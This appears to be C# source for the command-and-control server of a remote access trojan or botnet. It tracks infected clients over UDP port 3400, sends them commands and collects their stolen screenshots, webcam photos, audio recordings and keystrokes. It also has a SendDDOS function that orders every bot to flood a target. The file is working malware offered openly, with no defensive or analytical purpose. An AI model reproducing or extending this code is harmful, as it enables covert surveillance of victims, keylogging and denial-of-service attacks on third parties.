using System.Collections.Generic;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Xml.Linq;
using System.Text.Json;

namespace Dragon_
{
    internal static class Program
    {
        public static string GetClientsNumber(int cas)
        {
            if (!File.Exists(clientsFile))
            {
                
                return "0";
            }
            if (cas == 0)
            {
                var len = ClientStore.Clients.Count;

                return $"{len}";
            }
            else
            {
                var len = 0;
                foreach (var client in ClientStore.Clients)
                {
                    if(client.Status.ToLower() == "online")
                    {
                        len++;
                    }
                }
                return $"{len}";
            }
        }
        public class ClientInfo
        {
            public int Id { get; set; }
            public string Name { get; set; }
            public string IP { get; set; }
            public string Status { get; set; }
            public string Activity { get; set; }
            public string LastCheck { get; set; }
            public int Port { get; set; }
        }
        public static class ClientStore
        {
            public static List<ClientInfo> Clients = new List<ClientInfo>();
        }
        static public void Ensure(int casee)
        {
            if (casee == 0)
            {


                if (!Directory.Exists("data"))
                    Directory.CreateDirectory("data");
            }
            if(casee == 1)
            {
                if (!Directory.Exists("screenshots"))
                    Directory.CreateDirectory("screenshots");
            }
            if (casee == 2)
            {
                if (!Directory.Exists("pics"))
                    Directory.CreateDirectory("pics");
            }
            if (casee == 3)
            {
                if (!Directory.Exists("recor"))
                    Directory.CreateDirectory("recor");
            }
        }

        static readonly string clientsFile = "data/clients.json";
        static readonly string logFile = "data/logs.txt";

        static public void Log(string msg)
        {
            File.AppendAllText(logFile,
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n");
        }
        static void LoadClients()
        {
            if (!File.Exists(clientsFile))
            {
                Log("No clients file found");
                return;
            }

            var json = File.ReadAllText(clientsFile);
            ClientStore.Clients =
                JsonSerializer.Deserialize<List<ClientInfo>>(json)
                ?? new List<ClientInfo>();

            Log($"Loaded {ClientStore.Clients.Count} clients from file");
        }
        static void SaveClients()
        {
            var json = JsonSerializer.Serialize(
    ClientStore.Clients,
    new JsonSerializerOptions { WriteIndented = true, IncludeFields = true }
);
            File.WriteAllText(clientsFile, json);
            
        }

        public class HandleEverything
        {
            public Dictionary<string, byte[][]> images = new();

            public UdpClient Server = new UdpClient(3400); // Here you can select your PORT, i chose 3400 as default.

            public IPEndPoint ip = new IPEndPoint(IPAddress.Any, 0);

            public List<IPEndPoint> list = new List<IPEndPoint>();

            public Dictionary<IPEndPoint, DateTime> lastAlive = new Dictionary<IPEndPoint, DateTime>();


            void HandlePacket(byte[] packet)
            {
                int pipes = 0;
                int headerEnd = 0;

                for (int i = 0; i < packet.Length; i++)
                {
                    if (packet[i] == (byte)'|')
                    {
                        pipes++;
                        if (pipes == 4)
                        {
                            headerEnd = i + 1;
                            break;
                        }
                    }
                }

                string header = Encoding.ASCII.GetString(packet, 0, headerEnd);
                var p = header.Split('|');

                string id = p[1];
                int index = int.Parse(p[2]);
                int total = int.Parse(p[3]);

                int dataLen = packet.Length - headerEnd;
                byte[] chunk = new byte[dataLen];
                Buffer.BlockCopy(packet, headerEnd, chunk, 0, dataLen);

                if (!images.ContainsKey(id))
                    images[id] = new byte[total][];

                images[id][index] = chunk;
                var ran = GetRandomName();
                // Check if all chunks arrived
                if (images[id].All(x => x != null))
                {
                    using var ms = new MemoryStream();
                    foreach (var c in images[id])
                        ms.Write(c, 0, c.Length);

                    File.WriteAllBytes($"screenshots/screenshot-{ran}.jpg", ms.ToArray());
                    Process.Start(new ProcessStartInfo($@".\screenshots\screenshot-{ran}.jpg") { UseShellExecute = true });
                    images.Remove(id);
                }
            }
            public void SendDDOS(string ip, int port, int duration)
            {
                foreach (var i in list)
                {
                    try
                    {
                        var data = Encoding.UTF8.GetBytes($"ddos={ip}|{port}%{duration}");
                        Server.Send(data, data.Length, i);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"{ex}");
                    }
                }
            }
            public void AddUser(int user)
            {
                if (list == null || list.Count == 0)
                {
                    MessageBox.Show("The user list is empty.", "Info");
                    return;
                }

                if (user < 0 || user >= list.Count)
                {
                    MessageBox.Show("Invalid user index.", "Info");
                    return;
                }

                if (list[user] == null)
                {
                    MessageBox.Show("User does not exist at this index.", "Info");
                    return;
                }

                AppState.CurrentUser = user;
            }
            public string GetRandomName()
            {
                string name = "";
                var r = new Random();
                var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
                for (int i = 0; i < 9; i++) {

                    int num = r.Next(0, 52);
                    name += chars[num];
                }
                return name;
            }
            public void SendCommand(string command, int ClientIndex)
            {
                try {
                    var Client = list[ClientIndex];
                    if (Client == null)
                    {
                        MessageBox.Show("Client has ither not been chosen or the Index is not correct!", "Chose Client");
                    }
                    else
                    {
                        var c = Encoding.UTF8.GetBytes(command);
                        Server.Send(c, c.Length, Client);
                    }
                }
                catch { }
            }
            public void PingAllClients()
            {
                foreach (var c in ClientStore.Clients)
                {
                    c.Status = "Offline";
                    c.LastCheck = DateTime.Now.ToString("HH:mm:ss");
                    SaveClients();
                }

                // Step 2: Send ping to all
                foreach (var o in list)
                {
                    try
                    {
                        var msg = Encoding.UTF8.GetBytes("areyoualive");
                        Server.Send(msg, msg.Length, o);
                    }
                    catch
                    {

                    }
                }
                Log("Pinged all clients");


            }

            public void ListenToClients()
            {
                var lastcheck = ClientStore.Clients.Count;
                while (true)
                {
                    try { 


                        var server_listener = Server.Receive(ref ip);
                        var message = Encoding.UTF8.GetString(server_listener);

                        if (message.Contains("data1="))
                        {
                            string ppc = message.Replace("data1=", "");
                            var existing = ClientStore.Clients.FirstOrDefault(c =>
                                c.IP == ip.Address.ToString() &&
                                c.Name == ppc
                            );

                            if (existing == null)
                            {
                                var client = new ClientInfo
                                {
                                    Id = ClientStore.Clients.Count,
                                    Name = ppc,
                                    IP = ip.Address.ToString(),
                                    Port = ip.Port,
                                    Status = "Online",
                                    Activity = "Idle",
                                    LastCheck = DateTime.Now.ToString("HH:mm:ss")
                                };

                                ClientStore.Clients.Add(client);

                                
                                Log($"Client added: {client.IP}:{client.Port} ({client.Name})");
                                SaveClients();
                            }
                            else
                            {
                                existing.Port = ip.Port;  //
                                existing.Status = "Online";
                                existing.LastCheck = DateTime.Now.ToString("HH:mm:ss");
                                SaveClients();
                            }
                            if (ClientStore.Clients.Count  > lastcheck)
                            {
                                Log($"A new client Has been added and the list has been refreshed.");
                                lastcheck = ClientStore.Clients.Count;
                            }

                        }

                        var existingEp = list.FirstOrDefault(e => e.Address.Equals(ip.Address));

                        if (existingEp == null)
                        {
                            list.Add(ip);
                        }
                        else
                        {
                            int index = list.IndexOf(existingEp);
                            list[index] = ip; // This ensures that the PORT is always updated, because once the client reconnects after a shutdown their port wont be the same as in the list.
                        }

                        if (message == "ping")
                        {
                            Server.Send(Encoding.UTF8.GetBytes("pong"), 4, ip);
                        }

                        if (ip != list[AppState.CurrentUser])
                        {
                            continue;
                        }

                        if (message == "iamalive")
                        {

                            foreach (var clientInfo in ClientStore.Clients)
                            {
                                if (clientInfo.IP == ip.Address.ToString())
                                {
                                    clientInfo.Status = "Online"; // mark alive
                                    clientInfo.LastCheck = DateTime.Now.ToString("HH:mm:ss");
                                }
                            }
                        }

                        if (message.Contains("commandR="))
                        {
                            var data = message.Replace("commandR=", "");
                            AppState.CurrentResponse = data;

                            Application.Run(new ShowData());

                        }
                        if (message.Contains("commandP"))
                        {

                            string fname = "";
                            var data = message.Replace("commandP=", "");
                            byte[] imageBytes = Convert.FromBase64String(data);
                            fname = $@".\pics\webcam-{GetRandomName()}.jpg";
                            File.WriteAllBytes(fname, imageBytes);

                            Process.Start(new ProcessStartInfo(fname) { UseShellExecute = true });

                        }
                        if (message.Contains("cmdresponse="))
                        {
                            var data = message.Replace("cmdresponse=", "");
                            AppState.CmdResponse = data;
                        }
                        if (message.Contains("audio="))
                        {

                            void SaveAudio(string base64)
                            {
                                byte[] bytes = Convert.FromBase64String(base64);
                                var fname = $@".\recor\recorded-{GetRandomName()}.wav";
                                File.WriteAllBytes(fname, bytes);
                                Process.Start(new ProcessStartInfo(fname) { UseShellExecute = true });
                            }
                            var data = message.Replace("audio=", "");
                            SaveAudio(data);
                        }

                        if (Encoding.ASCII.GetString(server_listener, 0, 3) == "IMG")
                        {
                            HandlePacket(server_listener); // the screenshot chunk handler
                        }
                        if (message.Contains("keystr="))
                        {
                            var d = message.Split("=");
                            AppState.KeyStrokes += d[1];
                            AppState.keystroke_++;
                        }

                    }
                    
                    catch (SocketException ex)
                    {
                    if (ex.SocketErrorCode == SocketError.ConnectionReset)
                    {
                        continue;
                    }

                }
                    catch (Exception ex) { MessageBox.Show($"{ex}"); }
            }
            }
        }
            public class AppState
        {
            public static int CurrentUser = 0;
            public static string CurrentResponse = " invalid ";
            public static string? CmdResponse = null;
            public static string KeyStrokes = "";
            public static int keystroke_ = 0;
        }

        public static HandleEverything hh;
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Program.Ensure(0);
            Program.Ensure(1);
            Program.Ensure(2);
            Program.Ensure(3);
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            hh = new HandleEverything();

            // Start listening in the background
            Task.Run(() => hh.ListenToClients());
            try { LoadClients(); } catch { }
            ApplicationConfiguration.Initialize();

            Application.Run(new Form1());
            

        }
    }
}